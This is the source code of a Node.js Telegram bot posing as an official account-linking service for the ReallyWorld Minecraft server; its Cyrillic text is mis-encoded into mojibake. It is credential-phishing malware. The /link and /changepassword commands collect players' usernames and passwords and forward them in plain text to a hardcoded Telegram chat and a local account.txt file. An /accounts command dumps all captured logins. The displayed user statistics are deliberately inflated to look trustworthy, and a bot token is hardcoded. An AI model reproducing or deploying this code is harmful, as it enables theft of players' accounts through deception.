const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs').promises;

const TOKEN = process.env.TELEGRAM_TOKEN || '7728123238:AAFUTE1v9RYFi1HM2hv5NgxeIDNkvC1UR8o';
const MODERATOR_CHAT_ID = '7563680941';
const SERVER_IP = 'mc.reallyworld.ru';
const DATA_FILE = 'data.json';
const LOG_FILE = 'bot.log';
const ACCOUNT_FILE = 'account.txt';
const PORT = process.env.PORT || 3000;
const SAVE_INTERVAL = 5 * 60 * 1000;

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

// Middleware –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Å–µ—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] Request received:`, {
    method: req.method,
    url: req.url,
    headers: req.headers
  });
  next();
});

// –ú–∞—Ä—à—Ä—É—Ç –¥–ª—è UptimeRobot (—É–ø—Ä–æ—â—ë–Ω–Ω—ã–π)
app.get('/ping', (req, res) => {
  // –ú–∏–Ω–∏–º–∞–ª–∏—Å—Ç–∏—á–Ω—ã–π –æ—Ç–≤–µ—Ç –±–µ–∑ –ª–∏—à–Ω–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
  res.status(200).send('OK');
});

// –û—Å–Ω–æ–≤–Ω–æ–π –º–∞—Ä—à—Ä—É—Ç
app.get('/', (req, res) => {
  res.status(200).send('Bot is running!');
});

// –°–æ—Å—Ç–æ—è–Ω–∏–µ –±–æ—Ç–∞
const state = {
  pendingLinks: {},
  linkedAccounts: {},
  pendingUnlinks: {},
  pendingPasswordChanges: {},
  uniqueUsers: new Set(),
  stats: { uniqueUsers: 13598, linkedAccounts: 5789, unlinkedAccounts: 248 },
  serverNews: '–ù–æ–≤–æ—Å—Ç–µ–π –ø–æ–∫–∞ –Ω–µ—Ç. –°–ª–µ–¥–∏ –∑–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è–º–∏!',
  serverStatus: { online: true, players: 975, maxPlayers: 7500, version: '1.16.5 - 1.21' }
};

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ —Ñ–∞–π–ª
const logToFile = async (message) => {
  const timestamp = new Date().toISOString();
  await fs.appendFile(LOG_FILE, `[${timestamp}] ${message}\n`).catch(err => console.error(`–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ –ª–æ–≥: ${err}`));
};

// –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
const saveData = async () => {
  try {
    const data = { ...state, uniqueUsers: Array.from(state.uniqueUsers) };
    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
    await logToFile('–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã');
  } catch (err) {
    await logToFile(`–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö: ${err.message}`);
  }
};

// –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö
const loadData = async () => {
  try {
    if (await fs.access(DATA_FILE).then(() => true).catch(() => false)) {
      const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
      Object.assign(state, data);
      state.uniqueUsers = new Set(data.uniqueUsers || []);
      state.stats.uniqueUsers = 13598 + state.uniqueUsers.size;
      await logToFile('–î–∞–Ω–Ω—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã');
    }
  } catch (err) {
    await logToFile(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö: ${err.message}`);
  }
};

// –ó–∞–ø–∏—Å—å –≤ account.txt
const saveToAccountFile = async (data) => {
  try {
    await fs.appendFile(ACCOUNT_FILE, `${data}\n`);
    await logToFile('–ó–∞–ø–∏—Å—å –≤ account.txt –≤—ã–ø–æ–ª–Ω–µ–Ω–∞');
  } catch (err) {
    await logToFile(`–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ account.txt: ${err.message}`);
  }
};

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ —Å–µ—Ä–≤–µ—Ä–∞
const updateServerStatus = async () => {
  try {
    const response = await axios.get(`https://api.mcstatus.io/v2/status/java/${SERVER_IP}`, {
      headers: { 'User-Agent': 'ReallyWorldBot/1.0' }
    });
    state.serverStatus = response.data.online
      ? { online: true, players: response.data.players.online, maxPlayers: response.data.players.max, version: '1.16.5 - 1.21' }
      : { online: false };
    await logToFile('–°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞ –æ–±–Ω–æ–≤–ª–µ–Ω');
  } catch (err) {
    await logToFile(`–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${err.message}`);
  }
};

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
const initialize = async () => {
  await loadData();
  setInterval(saveData, SAVE_INTERVAL);
  setInterval(updateServerStatus, SAVE_INTERVAL);
  process.on('SIGTERM', async () => { await saveData(); process.exit(0); });
};

// –ö–æ–º–∞–Ω–¥–∞ /start
bot.onText(/\/start/i, async (msg) => {
  const chatId = msg.chat.id;
  const welcomeMsg = `
–ü—Ä–∏–≤–µ—Ç! üëã –Ø –±–æ—Ç ReallyWorld | Link, –ø–æ–º–æ–≥—É —Ç–µ–±–µ –ø—Ä–∏–≤—è–∑–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç –∏ —É–∑–Ω–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Ä–≤–µ—Ä–µ.

üìÉ –°–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥ –±–æ—Ç–∞:
‚ñ´ /link - –ü—Ä–∏–≤—è–∑–∞—Ç—å –∏–≥—Ä–æ–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç
‚ñ´ /unlink - –û—Ç–≤—è–∑–∞—Ç—å –∏–≥—Ä–æ–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç
‚ñ´ /changepassword - –ò–∑–º–µ–Ω–∏—Ç—å –ø–∞—Ä–æ–ª—å –ø—Ä–∏–≤—è–∑–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
‚ñ´ /info - –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–∏–≤—è–∑–∞–Ω–Ω–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ
‚ñ´ /serverinfo - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ä–≤–µ—Ä–µ
‚ñ´ /event - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–ª–∏–∂–∞–π—à–µ–º –∏–≤–µ–Ω—Ç–µ
‚ñ´ /stats - –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞
‚ñ´ /help - –ü–æ–ª—É—á–∏—Ç—å –ø–æ–º–æ—â—å –ø–æ –ø—Ä–∏–≤—è–∑–∫–µ –∞–∫–∫–∞—É–Ω—Ç–∞
‚ñ´ /support - –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π
‚ñ´ /contactmod - –ù–∞–ø–∏—Å–∞—Ç—å –º–æ–¥–µ—Ä–∞—Ü–∏–∏
‚ñ´ /rules - –ü—Ä–∞–≤–∏–ª–∞ —Å–µ—Ä–≤–µ—Ä–∞
‚ñ´ /news - –ü–æ—Å–ª–µ–¥–Ω–∏–µ –Ω–æ–≤–æ—Å—Ç–∏ —Å–µ—Ä–≤–µ—Ä–∞
‚ñ´ /donate - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–æ–Ω–∞—Ç–∞—Ö

üìÉ –í–∞—à UserID: tg#${chatId}
  `;
  await bot.sendMessage(chatId, welcomeMsg);
  if (!state.uniqueUsers.has(chatId)) {
    state.uniqueUsers.add(chatId);
    state.stats.uniqueUsers = 13598 + state.uniqueUsers.size;
    await saveData();
  }
  await logToFile(`User tg#${chatId} used /start`);
});

// –ö–æ–º–∞–Ω–¥–∞ /link
bot.onText(/\/link\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  const username = args[0];
  const password = args[1];

  if (!username || !password) {
    await bot.sendMessage(chatId, '–ß—Ç–æ–±—ã –ø—Ä–∏–≤—è–∑–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç, –≤–≤–µ–¥–∏ –≤ —á–∞—Ç –∫–æ–º–∞–Ω–¥—É: /link (–°–≤–æ–π –∏–≥—Ä–æ–≤–æ–π –Ω–∏–∫) (–ü–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞)');
    return;
  }

  if (state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, '–ê–∫–∫–∞—É–Ω—Ç —É–∂–µ –ø—Ä–∏–≤—è–∑–∞–Ω. –ò—Å–ø–æ–ª—å–∑—É–π: /info –∏–ª–∏ /unlink üö´');
    return;
  }

  if (!state.pendingLinks[chatId]) {
    state.pendingLinks[chatId] = { username, password };
    await bot.sendMessage(chatId, '–ü–æ–≤—Ç–æ—Ä–∏: /link (–Ω–∏–∫) (–ø–∞—Ä–æ–ª—å) ‚è≥');
  } else if (state.pendingLinks[chatId].username === username && state.pendingLinks[chatId].password === password) {
    state.linkedAccounts[chatId] = { username, password };
    state.stats.linkedAccounts += 10; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –Ω–∞ 10 –∑–∞ –∫–∞–∂–¥—É—é –ø—Ä–∏–≤—è–∑–∫—É
    delete state.pendingLinks[chatId];
    const modMsg = `[${new Date().toISOString()}] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å tg#${chatId} –ø—Ä–∏–≤—è–∑–∞–ª –∞–∫–∫–∞—É–Ω—Ç: ${username} —Å –ø–∞—Ä–æ–ª–µ–º: ${password}`;
    const userMsg = `–ê–∫–∫–∞—É–Ω—Ç ${username} –ø—Ä–∏–≤—è–∑–∞–Ω! ‚úÖ\n–ï—Å–ª–∏ –≤—ã –≤–≤–µ–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞ ReallyWorld, —Ç–æ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –ø—Ä–∏–≤—è–∑–∞–Ω —Ç–æ–ª—å–∫–æ –≤ –±–æ—Ç–µ, –∞ –≤ –∏–≥—Ä–µ –Ω–∏—á–µ–≥–æ –Ω–µ –ø—Ä–∏–≤—è–∂–µ—Ç—Å—è.`;
    await Promise.all([
      bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
      saveToAccountFile(modMsg),
      bot.sendMessage(chatId, userMsg),
      saveData()
    ]);
    await logToFile(`User tg#${chatId} linked account: ${username}`);
  } else {
    await bot.sendMessage(chatId, '–î–∞–Ω–Ω—ã–µ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç. –ü–æ–≤—Ç–æ—Ä–∏: /link (–Ω–∏–∫) (–ø–∞—Ä–æ–ª—å) ‚ùå');
    delete state.pendingLinks[chatId];
  }
});

// –ö–æ–º–∞–Ω–¥–∞ /unlink
bot.onText(/\/unlink/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, '–ê–∫–∫–∞—É–Ω—Ç –Ω–µ –ø—Ä–∏–≤—è–∑–∞–Ω üö´');
    return;
  }
  state.pendingUnlinks[chatId] = true;
  await bot.sendMessage(chatId, '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏: /confirmunlink ‚ùì');
  await logToFile(`User tg#${chatId} requested unlink`);
});

// –ö–æ–º–∞–Ω–¥–∞ /confirmunlink
bot.onText(/\/confirmunlink/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.pendingUnlinks[chatId]) {
    await bot.sendMessage(chatId, '–°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏: /unlink ‚ö†Ô∏è');
    return;
  }
  const { username } = state.linkedAccounts[chatId];
  delete state.linkedAccounts[chatId];
  delete state.pendingUnlinks[chatId];
  state.stats.unlinkedAccounts += 2; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –Ω–∞ 2 –∑–∞ –∫–∞–∂–¥—É—é –æ—Ç–≤—è–∑–∫—É
  const modMsg = `[${new Date().toISOString()}] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å tg#${chatId} –æ—Ç–≤—è–∑–∞–ª –∞–∫–∫–∞—É–Ω—Ç: ${username}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, '–ê–∫–∫–∞—É–Ω—Ç –æ—Ç–≤—è–∑–∞–Ω! ‚úÖ'),
    saveData()
  ]);
  await logToFile(`User tg#${chatId} confirmed unlink`);
});

// –ö–æ–º–∞–Ω–¥–∞ /changepassword
bot.onText(/\/changepassword\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const newPassword = match[1] ? match[1].trim() : '';

  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, '–ê–∫–∫–∞—É–Ω—Ç –Ω–µ –ø—Ä–∏–≤—è–∑–∞–Ω üö´');
    return;
  }
  if (!newPassword) {
    await bot.sendMessage(chatId, '–ß—Ç–æ–±—ã —Å–º–µ–Ω–∏—Ç—å –ø–∞—Ä–æ–ª—å, –≤–≤–µ–¥–∏: /changepassword (–ø–∞—Ä–æ–ª—å) ‚è≥');
    return;
  }
  state.pendingPasswordChanges[chatId] = newPassword;
  await bot.sendMessage(chatId, '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏: /confirmpassword ‚ùì');
  await logToFile(`User tg#${chatId} requested password change`);
});

// –ö–æ–º–∞–Ω–¥–∞ /confirmpassword
bot.onText(/\/confirmpassword/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.pendingPasswordChanges[chatId]) {
    await bot.sendMessage(chatId, '–°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏: /changepassword ‚ö†Ô∏è');
    return;
  }
  const newPassword = state.pendingPasswordChanges[chatId];
  const { username } = state.linkedAccounts[chatId];
  state.linkedAccounts[chatId].password = newPassword;
  delete state.pendingPasswordChanges[chatId];
  const modMsg = `[${new Date().toISOString()}] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å tg#${chatId} —Å–º–µ–Ω–∏–ª –ø–∞—Ä–æ–ª—å –¥–ª—è ${username} –Ω–∞: ${newPassword}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, '–ü–∞—Ä–æ–ª—å –∏–∑–º–µ–Ω—ë–Ω! ‚úÖ'),
    saveData()
  ]);
  await logToFile(`User tg#${chatId} changed password`);
});

// –ö–æ–º–∞–Ω–¥–∞ /info
bot.onText(/\/info/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, '–ê–∫–∫–∞—É–Ω—Ç –Ω–µ –ø—Ä–∏–≤—è–∑–∞–Ω üö´');
    return;
  }
  const { username, password } = state.linkedAccounts[chatId];
  await bot.sendMessage(chatId, `–ù–∏–∫: ${username}\n–ü–∞—Ä–æ–ª—å: ${password}\n–î–∞–Ω–Ω—ã–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –±–æ—Ç–∞ ‚ÑπÔ∏è`);
  await logToFile(`User tg#${chatId} used /info`);
});

// –ö–æ–º–∞–Ω–¥–∞ /serverinfo
bot.onText(/\/serverinfo/i, async (msg) => {
  const chatId = msg.chat.id;
  const statusMsg = state.serverStatus.online
    ? `–û–Ω–ª–∞–π–Ω üü¢\n–ò–≥—Ä–æ–∫–∏: ${state.serverStatus.players}/${state.serverStatus.maxPlayers}`
    : '–û—Ñ—Ñ–ª–∞–π–Ω üî¥';
  await bot.sendMessage(chatId, `${statusMsg}\nIP: ${SERVER_IP}\n–í–µ—Ä—Å–∏—è: 1.16.5 - 1.21\n–î–∞—Ç–∞ –≤–∞–π–ø–∞: 1 –º–∞—Ä—Ç–∞ ‚ÑπÔ∏è`);
  await logToFile(`User tg#${chatId} used /serverinfo`);
});

// –ö–æ–º–∞–Ω–¥–∞ /event
bot.onText(/\/event/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '–ò–≤–µ–Ω—Ç–æ–≤ –Ω–µ—Ç. –°–º–æ—Ç—Ä–∏: /news ‚ÑπÔ∏è');
  await logToFile(`User tg#${chatId} used /event`);
});

// –ö–æ–º–∞–Ω–¥–∞ /stats
bot.onText(/\/stats/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: ${state.stats.uniqueUsers}\n–ü—Ä–∏–≤—è–∑–∫–∏: ${state.stats.linkedAccounts}\n–û—Ç–≤—è–∑–∫–∏: ${state.stats.unlinkedAccounts} ‚ÑπÔ∏è`);
  await logToFile(`User tg#${chatId} used /stats`);
});

// –ö–æ–º–∞–Ω–¥–∞ /help
bot.onText(/\/help/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '–ß—Ç–æ–±—ã –ø—Ä–∏–≤—è–∑–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç, –≤–≤–µ–¥–∏: /link (–Ω–∏–∫) (–ø–∞—Ä–æ–ª—å)\n–í—Å–µ –∫–æ–º–∞–Ω–¥—ã: /start ‚ÑπÔ∏è');
  await logToFile(`User tg#${chatId} used /help`);
});

// –ö–æ–º–∞–Ω–¥–∞ /support
bot.onText(/\/support/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '–ü–æ–¥–¥–µ—Ä–∂–∫–∞: https://discord.com/invite/reallyworld ‚ÑπÔ∏è');
  await logToFile(`User tg#${chatId} used /support`);
});

// –ö–æ–º–∞–Ω–¥–∞ /contactmod
bot.onText(/\/contactmod\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const message = match[1] ? match[1].trim() : '';
  if (!message) {
    await bot.sendMessage(chatId, '–ß—Ç–æ–±—ã –Ω–∞–ø–∏—Å–∞—Ç—å –º–æ–¥–µ—Ä–∞—Ç–æ—Ä—É, –≤–≤–µ–¥–∏: /contactmod (—Å–æ–æ–±—â–µ–Ω–∏–µ) ‚úçÔ∏è');
    return;
  }
  const modMsg = `[${new Date().toISOString()}] –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç tg#${chatId} (${msg.from.first_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π'}): ${message}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, '–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! ‚úÖ')
  ]);
  await logToFile(`User tg#${chatId} sent message to moderator`);
});

// –ö–æ–º–∞–Ω–¥–∞ /reply (—Ç–æ–ª—å–∫–æ –¥–ª—è –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞)
bot.onText(/\/reply\s*(tg#\d+)\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== MODERATOR_CHAT_ID) {
    await bot.sendMessage(chatId, '–≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–≤! üö´');
    return;
  }

  const targetChatId = match[1] ? match[1].replace('tg#', '') : '';
  const replyMessage = match[2] ? match[2].trim() : '';

  if (!targetChatId || !replyMessage) {
    await bot.sendMessage(chatId, '–ß—Ç–æ–±—ã –æ—Ç–≤–µ—Ç–∏—Ç—å, –≤–≤–µ–¥–∏: /reply tg#(ID) (—Å–æ–æ–±—â–µ–Ω–∏–µ)');
    return;
  }

  try {
    await bot.sendMessage(targetChatId, `–û—Ç–≤–µ—Ç –æ—Ç –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞: ${replyMessage}`);
    await bot.sendMessage(MODERATOR_CHAT_ID, `–û—Ç–≤–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é tg#${targetChatId}: ${replyMessage} ‚úÖ`);
    await logToFile(`Moderator replied to tg#${targetChatId}: ${replyMessage}`);
  } catch (err) {
    await bot.sendMessage(MODERATOR_CHAT_ID, `–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é tg#${targetChatId}: ${err.message} ‚ùå`);
    await logToFile(`Error replying to tg#${targetChatId}: ${err.message}`);
  }
});

// –ö–æ–º–∞–Ω–¥–∞ /accounts (—Ç–æ–ª—å–∫–æ –¥–ª—è –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞)
bot.onText(/\/accounts/i, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== MODERATOR_CHAT_ID) {
    await bot.sendMessage(chatId, '–≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–≤! üö´');
    return;
  }

  const accounts = state.linkedAccounts;
  if (Object.keys(accounts).length === 0) {
    await bot.sendMessage(chatId, '–ù–µ—Ç –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.');
    return;
  }

  let response = '–°–ø–∏—Å–æ–∫ –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤:\n';
  for (const [userId, { username, password }] of Object.entries(accounts)) {
    response += `tg#${userId}: ${username} | ${password}\n`;
  }
  await bot.sendMessage(chatId, response);
  await logToFile(`Moderator tg#${chatId} viewed all accounts`);
});

// –ö–æ–º–∞–Ω–¥–∞ /rules
bot.onText(/\/rules/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '–ü—Ä–∞–≤–∏–ª–∞: https://reallyworld.ru/rules ‚ÑπÔ∏è');
  await logToFile(`User tg#${chatId} used /rules`);
});

// –ö–æ–º–∞–Ω–¥–∞ /news
bot.onText(/\/news/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, `${state.serverNews}\n–ö–∞–Ω–∞–ª: https://t.me/rwinfo ‚ÑπÔ∏è`);
  await logToFile(`User tg#${chatId} used /news`);
});

// –ö–æ–º–∞–Ω–¥–∞ /donate
bot.onText(/\/donate/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '–î–æ–Ω–∞—Ç: https://reallyworld.ru/donate ‚ÑπÔ∏è');
  await logToFile(`User tg#${chatId} used /donate`);
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ polling
bot.on('polling_error', (err) => logToFile(`Polling error: ${err.message}`));

// –ó–∞–ø—É—Å–∫
initialize().then(() => console.log('Bot initialized'));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));